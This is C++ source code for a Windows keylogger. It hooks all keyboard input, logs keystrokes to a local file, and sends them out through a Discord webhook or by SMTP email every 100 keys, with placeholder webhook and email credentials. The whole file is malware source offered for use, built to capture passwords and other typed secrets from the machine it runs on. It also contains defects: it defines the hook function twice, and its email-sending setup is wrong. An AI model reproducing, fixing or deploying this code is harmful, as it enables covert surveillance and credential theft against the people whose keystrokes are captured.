#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include "curl/curl.h"// For sending POST requests


const std::string LOG_FILE = "keystrokes.log";     // logs are saved locally in the same folder 

// Discord webhook URL (replace with your own webhook URL)
const std::string DISCORD_WEBHOOK_URL = "YOUR WEBHOOK";

// Function to log keystrokes to a file
void logKeystroke(const std::string& key) {
    std::ofstream logFile(LOG_FILE, std::ios::app);
    if (logFile.is_open()) {
        logFile << key;
        logFile.close();
    }
    else {
        std::cerr << "Failed to open log file." << std::endl;
    }
}

// Email configuration
const std::string EMAIL_FROM = "your_email@example.com"; // Your email address
const std::string EMAIL_TO = "recipient_email@example.com"; // Recipient email address
const std::string EMAIL_SUBJECT = "Keylogger Logs";
const std::string SMTP_SERVER = "smtp.example.com"; // SMTP server address
const std::string SMTP_USERNAME = "your_email@example.com"; // SMTP username
const std::string SMTP_PASSWORD = "your_password"; // SMTP password


// Function to get the character representation of a virtual key code
std::string getKeyName(DWORD vkCode) {
    switch (vkCode) {
    case VK_SPACE: return " ";
    case VK_RETURN: return "\n";
    case VK_SHIFT: return "[SHIFT]";
    case VK_CONTROL: return "[CTRL]";
    case VK_MENU: return "[ALT]";
    case VK_CAPITAL: return "[CAPSLOCK]";
    case VK_BACK: return "[BACKSPACE]";
    case VK_TAB: return "[TAB]";
    case VK_ESCAPE: return "[ESC]";
    case VK_PRIOR: return "[PAGEUP]";
    case VK_NEXT: return "[PAGEDOWN]";
    case VK_END: return "[END]";
    case VK_HOME: return "[HOME]";
    case VK_LEFT: return "[LEFT]";
    case VK_UP: return "[UP]";
    case VK_RIGHT: return "[RIGHT]";
    case VK_DOWN: return "[DOWN]";
    case VK_DELETE: return "[DELETE]";
    case VK_LWIN: return "[LWIN]";
    case VK_RWIN: return "[RWIN]";
    default: {
        char key = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
        return std::string(1, key);
    }
    }
}

// Function to send a POST request to Discord
void sendToDiscord(const std::string& message) {
    CURL* curl = curl_easy_init();
    if (curl) {
        // Set the URL
        curl_easy_setopt(curl, CURLOPT_URL, DISCORD_WEBHOOK_URL.c_str());

        // Set the POST data
        std::string payload = "{\"content\":\"" + message + "\"}";
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

        // Set the headers
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Perform the request
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Failed to send message to Discord: " << curl_easy_strerror(res) << std::endl;
        }

        // Clean up
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    else {
        std::cerr << "Failed to initialize CURL." << std::endl;
    }
}

// Function to send an email with the keystroke logs
void sendEmail(const std::string& message) {
    CURL* curl = curl_easy_init();
    if (curl) {
        // Set the URL (SMTP server)
        curl_easy_setopt(curl, CURLOPT_URL, (SMTP_SERVER + ":587").c_str());

        // Set the username and password for authentication
        curl_easy_setopt(curl, CURLOPT_USERNAME, SMTP_USERNAME.c_str());
        curl_easy_setopt(curl, CURLOPT_PASSWORD, SMTP_PASSWORD.c_str());

        // Enable STARTTLS for secure communication
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);

        // Set the email headers
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, ("From: " + EMAIL_FROM).c_str());
        headers = curl_slist_append(headers, ("To: " + EMAIL_TO).c_str());
        headers = curl_slist_append(headers, ("Subject: " + EMAIL_SUBJECT).c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, headers);

        // Set the email body
        std::string emailBody = "Keystroke logs:\n" + message;
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_READDATA, emailBody.c_str());

        // Perform the request
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Failed to send email: " << curl_easy_strerror(res) << std::endl;
        }

        // Clean up
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    else {
        std::cerr << "Failed to initialize CURL." << std::endl;
    }
}

// Hook procedure to capture keystrokes  ( if you want to use DISCORD, uncomment this one. )
LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;
        std::string keyName = getKeyName(vkCode);
        logKeystroke(keyName);

        // Send the keystroke to Discord
        sendToDiscord(keyName);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Hook procedure to capture keystrokes ( currently one using, send to email instead of discord. More tested )
LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    static std::string keystrokes; // Accumulate keystrokes
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;
        std::string keyName = getKeyName(vkCode);
        keystrokes += keyName;

        // Send the accumulated keystrokes via email every 100 keystrokes
        if (keystrokes.length() >= 100) {
            sendEmail(keystrokes);
            keystrokes.clear();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Set a global keyboard hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHook, NULL, 0);
    if (hook == NULL) {
        std::cerr << "Failed to set keyboard hook." << std::endl;
        return 1;
    }

    std::cout << "Keylogger is running. Press [ESC] to stop." << std::endl;

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_KEYDOWN && msg.wParam == VK_ESCAPE) {
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the keyboard hook
    UnhookWindowsHookEx(hook);
    return 0;
}









